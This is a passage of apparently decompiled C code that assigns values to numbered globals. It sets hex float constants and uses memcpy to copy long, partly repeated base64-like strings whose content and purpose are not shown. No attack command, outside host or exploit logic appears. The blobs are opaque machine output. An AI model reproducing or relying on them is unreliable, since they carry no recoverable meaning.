CsVLOc6UOyeqYS+7UHFGOIo44JU5NzMJ1tPRv7phHr+AkI0WKJ0eYlk2qI1ZXQX+AUfmSBe5EtqmOdcWMxrLkx8CZFOXZceOOsChgLG7xcgi8pIXUARIi0QEPHk9rK4HxVO0TbZqwiq0QqTq+85Xb4+QQ0eXX3U6xik0R5ezmtGff4evu8xfMFAwz7BkVCGpl/cq/wQQT/l08knpCQH8i7sPh+/n3sow07IxKnwe4z4gUB0qW8UCFjyLfynhEJXUZLcwG+xJXCrn2ACQRXvYf9KJly3DS99BBo+HWzFl8dvPs6pP3oS4cF+ukVPotojWwlWgBubjiZ9H8+9LrdJ06AO5P+aJpfbeqKjJT7vr2Ddhl8xU2d2Y1Iuys5TytCo6VyL/2OMkh8Xd/uxIcLXlrXkCaF76WjPmNkahVfphCFVXIV8pz/zsJ80BQ7kKONSR+M8Dn6PIP263jK836WGTcqTaWB3DI0a/0DB11ydekB1eBeGr/+RE6pTf40XYTNnpr34L7LzDgRuBdUgdtcmGm7G8nXS/iAjqcsxzmmP6z8CzN1th5P5xMtLvct8uvBK0+RYApTjXZ05Jm/Y3QXAs2xPrT0zv76dx+qLAfa7vC4ZH6KUbkSZLZomHg5e1SHinswmpTbZamf8HlPgyt2OjqN5DOF3mqBg/Xzk1Qxo0y5LoCrCvFA5SDuIcvRmbjbJ3sj3yIfDl5Qe1np/fmhssM6Hk3+TWOSCmLs+BN/qTAhXHu3UZAQi4h/XOQPM3Mxj19S3XFonCmDBY12MFmYFopeKb+A9cbZ7sS2v4t9pEdsRpweSB3qoFxDekJtPSflugazyWKlhKRQk3HJBaj3tlf6XyiBNQiQi7fKbju97jNZZmQIK5QPvPsdrh5vZtVT7A0/padnNrBUR1pOp6fAZERDoBYRdD5bLVVEnf6A0HiVNpnsod8Yu2HUAbVNEEx4jRJulnWSJagt4uuKhelScrQZ7B7GizgSTZNrpMrMas2MGIRDL/6G9PLEicbqX4wcTgiX7IY1eMwzvfJmz11lgoqdH09ydJTdH1OWY+iLZY83r5clvtdlA1cTqwtOjaF+sG+6yrNo22im3v/kOL7pyyv9ca4aALuTtvKWraApKYnkT3lqUByqOSCtfqTfHl/Oc4dKnNj3JNCdaAcCyEvJrSLNM0+x1ZOeHIKfoES6Cg4Hnchs5yd0JoHkjKSDOZ5Q4AZu39qH29hxHUOow4+IJxoV98XTbVU3xeBLHVnq4Iqi+9T9M/85W65IdWPio7zvsIWPX2WfuK+YlSr7gr3rkHsjDMVUa2W+Cm9g7kFJfwMHriymhe2SKwad0AYKE4BHqfts+VTXhfAJjjsF9rYe1zTlqGCcjp9rObr4xHSWB7bHI", 365);
    g213 = -0x80000000;
    g214 = 0x3f0d9316;
    *(int16_t *)&g215 = 0;
    g216 = g6;
    g217 = v3;
    memcpy((char *)&g218, "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", 365);
    g219 = -0x7d400000;
    g220 = 0x3f8a7ec5;
    *(int16_t *)&g221 = 0;
    g222 = g6;
    g223 = 1006;
    memcpy((char *)&g224, "Co6VyL/2OMkh8Xd/uxIcLXlrXkCaF76WjPmNkahVfphCFVXIV8pz/zsJ80BQ7kKONSR+M8Dn6PIP263jK836WGTcqTaWB3DI0a/0DB11ydekB1eBeGr/+RE6pTf40XYTNnpr34L7LzDgRuBdUgdtcmGm7G8nXS/iAjqcsxzmmP6z8CzN1th5P5xMtLvct8uvBK0+RYApTjXZ05Jm/Y3QXAs2xPrT0zv76dx+qLAfa7vC4ZH6KUbkSZLZomHg5e1SHinswmpTbZamf8HlPgyt2OjqN5DOF3mqBg/Xzk1Qxo0y5LoCrCvFA5SDuIcvRmbjbJ3sj3yIfDl5Qe1np/fmhssM6Hk3+TWOSCmLs+BN/qTAhXHu3UZAQi4h/XOQPM3Mxj19S3XFonCmDBY12MFmYFopeKb+A9cbZ7sS2v4t9pEdsRpweSB3qoFxDekJtPSflugazyWKlhKRQk3HJBaj3tlf6XyiBNQiQi7fKbju97jNZZmQIK5QPvPsdrh5vZtVT7A0/padnNrBUR1pOp6fAZERDoBYRdD5bLVVEnf6A0HiVNpnsod8Yu2HUAbVNEEx4jRJulnWSJagt4uuKhelScrQZ7B7GizgSTZNrpMrMas2MGIRDL/6G9PLEicbqX4wcTgiX7IY1eMwzvfJmz11lgoqdH09ydJTdH1OWY+iLZY83r5clvtdlA1cTqwtOjaF+sG+6yrNo22im3v/kOL7pyyv9ca4aALuTtvKWraApKYnkT3lqUByqOSCtfqTfHl/Oc4dKnNj3JNCdaAcCyEvJrSLNM0+x1ZOeHIKfoES6Cg4Hnchs5yd0JoHkjKSDOZ5Q4AZu39qH29hxHUOow4+IJxoV98XTbVU3xeBLHVnq4Iqi+9T9M/85W65IdWPio7zvsIWPX2WfuK+YlSr7gr3rkHsjDMVUa2W+Cm9g7kFJfwMHriymhe2SKwad0AYKE4BHqfts+VTXhfAJjjsF9rYe1zTlqGCcjp9rObr4xHSWB7bHI", 251);
    *(int16_t *)&g224 = 0x6f43;
    g225 = -0x80000000;
    g226 = 0x3f07cf18;
    *(int16_t *)&g227 = 0;
    g228 = g6;
    g229 = 1502;
    memcpy((char *)&g230, (char *)&g32, 375);
    *(int16_t *)&g230 = *(int16_t *)&g32;
    g231 = 0x60000000;
    g232 = 0x3f40144c;
    *(int16_t *)&g233 = 0;
    g234 = g6;
    g235 = v3;
    memcpy((char *)&g236, "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", 365);
    g237 = -0x50000000;
    g238 = 0x3f33a9d1;
    *(int16_t *)&g239 = 0;
    g240 = g6;
    g241 = 1233;
    memcpy((char *)&g242, "N4dygf5cnq704De/LQ4yD99dWMxFnDNC2pqxR5PwjMSZEu1iS8eTgboOG0EtWkXMSByt6YvBIDqliVbeHCKKWQP0J+x/Fdb05sHN0L50yOqAfnMgSQUGrWyWOj8dg8gkv8cNFwSCYUtsQwyV3wBnWPStAvJ3C6f8Ff1lbEdhh3dqMvjWYyOT+IQ1mB+gy9DW7IQVzhU9zUptVV/8VjL/hXt/KYuLk1jfc2WkjOvz5rw8+RfAqZsGzjt1itVoqxU57HOqksFATmVOVv14hLGdSeH/JRREmcrnd3g6sSoXT9rgK/HbSvCodEBpdhyk7KFGfibeIycvcYUzsjwocNZMiyot6qMjjKIAC6sFjD+f9N6o0wUogWamhbQuQW8SyVyn7zlvs8Xc9zGyZ21D52jGt5gzUNIz5+rzOSitaSQRuFWurwhEdVImJvssG3yEs0/ZSA5RGkwlX0z2Zupbod+1Y4dYgvVmE9JSmet0QqeSEB5gFqS8ae8IzOHGKmgbE3tuPj4Er6htDgOJG0LL7QlL0Mam56IDW2JatOw+UHSFfCa6xtiM1SZjFEqBoSkIZzUh3ufg1/BgaN9ahWjOELM/oLsaLWaWkBNpQcNK8bFtNS7P9EpmbuEXxDfeDD58iEGYXfQcP7VpR2sOT9LwJAIeh6A+jdqwmIG6+oQ8vrHKPDnaYKv3S108w+OEeT45BFYJKwWk+Ra3vRxnKbnRwJQuKEFILgZJSbVEG96tpqBQ4zYjNt/F17ESbH8qo84gKWu6RAAR6Pr+Urtj/81uAJJZHtd0NwBxGdcO566nFCFN3gjt0JoeF2MLmt0/P2yR9B9PGwlFViNLLfIDbqh7n5SJcMx5G6bTAD68SMpC3btqkL79qvdoP/NWLWfNbfFa+bw7GloQ+rmDHBlJQ5hg6IMi+REkxWwPquOqXoXnOtVv0M2mh0JKr6B7BinPYKTvRTwillNISUh2MVr8BfHLz52EoxrxSlctRKrIxVtBd41QsZ8KU/39GgueUuZIf7M0Cfck4pAOAsx5yeog9EtNtz2iXgOo3hyDc0h1Y++cVvvhmuig0qXJzt8Cavc/WYSDuDbVfMVxUwP+KTyjbOaYDJLrfBU0g1+oCQ8LF4i6eZn3/9Qah9fJpXBEVUkjQ6zHR9YeOjAqKuR4gqR+88y47cE25XMRehX66tw7i5iYm46aLdkMun6+qqX0sX4VP15G1+tOmBW3Cgi1YWV+NqKly", 308);
    *(char *)&g242 = 78;
    g243 = 0x46000000;
    g244 = 0x3f4deac8;
    *(int16_t *)&g245 = 0;
    g246 = g6;
    g247 = 1502;
    memcpy((char *)&g248, (char *)&g33, 375);
    *(int16_t *)&g248 = *(int16_t *)&g33;
    g249 = -0x18000000;
    g250 = 0x3f3e140d;
    *(int16_t *)&g251 = 0;
    g252 = g6;
    g253 = v3;
    memcpy((char *)&g254, "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", 365);
    g255 = 0x66000000;
    g256 = 0x3f4098b6;
    *(int16_t *)&g257 = 0;
    g258 = g6;
    g259 = 1233;
    memcpy((char *)&g260, "AqNHj9lpmOzhgYFJ8S74mDjUQTmqcUBQnswViiq0rN/8v7MdbIvLxGUAKJkbPRrAe4kQ73AYLzTwBvC/GK+CECgapQMSUFYwqTJTOykbMv9M+T5YPuNjJ27XbBy8D8TUEJj7jXWLER69l8uu9NXxTDvlFPvke7PbvCiA7RYD+8j+V66tmiFgexu92ur4663V6sKEeQZV5BcYIJHTzQttJ8JnC9fI4zhZDwAc6x/q9kWWN/ftPtPGb77yloLnzrHiDh8kTB4RZTHBJTNKVEaDCvYlmlhu+qt/xW5lwO4kfrhsAShajavx/3xkyv9fkywmMgycTyrRJf1xIdZb0L5TJ5+oFv7yIznWNJEHhC01cwcgNtxWZqPqCpT1dOwI789mlDzlHjEjOthVmY/QC2Tu9yFKeftGdrMCvS8UaJegNfp38NUnwkiEEphdwpJZ7YZPRsEjTktmJWQuzgt8q7wMj1/gxLQ6UROKrR0i2MF/2nspdY292vKniUYacvm1NgZoQINwrxGf9o6VRcbqPiLSXlpdUrJjmbfU6ax1bgRWHrFWe+aEEOeebH/MqKZxvPSNRUn9K75fbrVqle5IlrQ+DjMI53LqvB31St31xR6/IQhisjYEQFY7Cdn5NSvzjp7FxBB9yVHNCDiMt7BAx3PlrRFsZfZ6fy7KdaeouMijcjXpgSNuCVUKpPMTK731XsM+BQ4bnh0Cav96Aqa91DZTRSgSBXozec+FJ4EZiKy72SCozT4gMufxcQguk9fTuxZO5IhycNhnngDMSZ2BA/zPvysHLLjVriejzeZ0A2WrGYw4M1UfDGfl0MLy9OAsSH4vkPj55s9RuzK06yaSp2wFgGsFFOJV1HaAWGdpZCUcK4os64byZlfSpHTw6/Ysyq9f+Ami448RTgPMv4UAhwMnhOR9Pb2UlU4XgHjK0buu0dZrL9m2d/KKnzrachGAMrwwpFFetlqRe9keiEGSd/AD+qKKvuzqDglY8VoevdGcrVMoklXY046c5vFoCfgRuYCILP4aI6b0eWbQxdPB6vDfjNqq7XZ20kKCye5A68L3Io+GwYvlTg2itOJ4aeWkgKgMJVZHy9h5trlS77ncXDx75UF1U55h47BZOvkPjUC4Era/D3r8iCrjv8DPp3CUIKhu7Lfn7+B9/KcXHNgohyqZy1hnI0iBrTv1JUjPxgg1mcPt6XYI+pLSSDe4IfEGJHkYiQpP3YFrMqTXOjxGK", 308);
    *(char *)&g260 = 65;
    g261 = -0x18000000;
    g262 = 0x3f30c7b8;
    *(int16_t *)&g263 = 0;
    g264 = g6;
    g265 = 1502;
    memcpy((char *)&g266, (char *)&g34, 375);
    *(int16_t *)&g266 = *(int16_t *)&g34;
    g267 = 0x5b000000;
    g268 = 0x3f8afba5;
    *(int16_t *)&g269 = 0;
    g270 = g6;
    g271 = v3;
    memcpy((char *)&g272, "XUEZWScY9Wd5NxIaAymV7D4nhYxXPgJPYplP/JZLRdRNsF07V9WLht3JteSO2y+ZBce5J9eVRWen7Fyf2PSE0P8C+x5s2jXYRgElfKZEpNmQqKR+3mq80O0/iY1BfcnkOVT4EryG31z26cgh6xnUN9uStuyFWstej8ORiGNY+gy+h9Ma1tbKzaCvubVAwWAbfqzlWJKaHyKsSZT207h0dRNDbrp4uTBoP/LB966BONJNWl+6qmiVJBl7gIEY24zNVSFsVzZCRwz/J3X4PhBfo4fFiQqEDAlwqNdfKuQT+86wYbKCfh6d+eoowVCM20fpL1Ql20GyOlLnxzKto9h8OG0TfHF3ReH8o4ilB6QLiqSCauuitMHUWX0dznaakzpj3WtoX2nZBmh7lvVTTg9RfXNAXOo3/Q0TEUP9xACBl3h1Q+YCtqN2s4O6/Z//XnFQ4VaLhUS2u6nxobFloPVAjbXp7POdoj3lBrxUYoaYqr9btwiNrigI7OKz7d1f0FDY4e4vzjWEJyqzjdBzqrFqw7+FotuAypht8B0Dkm06jgy2dhSd1W+R0TADSowcrOJOuPYm7VtniJEy+Bz/F2czbt881JIA1YhSOijvyUoG9Rt2f+P7/3AhIdBcMW8Bf6m+89BsOMx/VN6XFq93fAQTQGTbhpnoEI2vD0wF1cCkcwsGsgUGkyyxbj3Gq0+5VcXhEYujDvs2WkiFegKTK8w/IUThynLN1O+08NZ5jqKMPw9GYeSGCpGeEv8jENZhKqfV9POm9IVUMCjJNvGXgKbsTMFo3qU8fiiaMzd6zFXT4ow3bcoyeYfkXuiNZQH3ulbB5eVwCWiBuWlGdGKDnCsxGOmymI6ha9OUL/Iyqw8JIjaILGTlhCvTI+ZX+z7XKdNz4ATCsddiVKkwIyiRllfMN9ZaAZCB8WNOIyNi9G2/OxjyvqmKtwsiOB3j7ceyAJa/QSEeA8zHsIXiCC36PFVDcdmCqD81xmIOWCZTMcaWb+6j8DGOazwSuD44d/tU0usP79h4/byLy3pVNEHlFEEeIi45DgUa1X07NxmSzDrouta37//FTiA40EiAhsuPdWdj/kDql9VPHC6uK8TaiztM9uP97Ytl3LNLcBCnaUxfzUVgpVDASsdYKr0B6i9cstHZxOqWRnZAIjK0MCo4ccL/7hDAOG2NamNlJGk5fO93DTklHdQLoyLJvzSQgIU8Cvk2pRXpw01iwIbi+5VbFNK1SmFhmxNZJI1dk4syjNrRFArd9m04gaeKZ1RC7AAe5ZNSXGWZhwXXoVyehwhEg0wpV7hAg0GDe+JseaB3CCvN2dtQhNgkCUbtDJo7+DBsDJMFw+zTxuyORRMQ79F2wxDRoXagsvq26XV/agpNU21MWzi6yRWXiOIu4ibLqhDsAaw3uSUTqwwwvQ0jtYqQpy2QBSgYE0QrNHOME8g9m+nkNMVAdDDDiCKZ/+3CmrNSY93T90CYblH3/arSy3/Ikpfppab7v/ttDltmWAYtUFrPXSAzzfZIbOuF76kg2Cxr6OmdaANIZv73EGYutwccQhLchwtdwE6wocqyfxD7d6UnbC+IJn84Hrp/IZl8/GMYHMaYujmbfmpDkuMrJVG9GFDyYtmMEoBed0AiRihI/19JQIvCeEER6Z0LS4orDQQB5LQcRHKUDXyiU8whdEYNVyve1MAWt/TjSAZNVoLog3MEfx2qlXZFKZkmmBch01PeIpzevpf9xdsPItHzzgBLiyk2PVZG5eOOjiyo6DysGdE8JHCwqJidXARxJG1+9nybvRj55sH2KMmgId7x7/L1HK6oVRC/h1frsvol3nVUaDdRa7jwmslNIRERnJbWQLwHQvbbgcZJl0aqNH6mWJ5QRK1t54d/Tu44oZ62xqmCgzVvDxe9ws1lxtW2urNSAlKN5pLn+nnG+xPt3grXpVnGk78g0IMobHc1dF+AtRYDOMoCfw+i8ANdrfp8W+UkvMNkHNySjWOI7NnaGBs/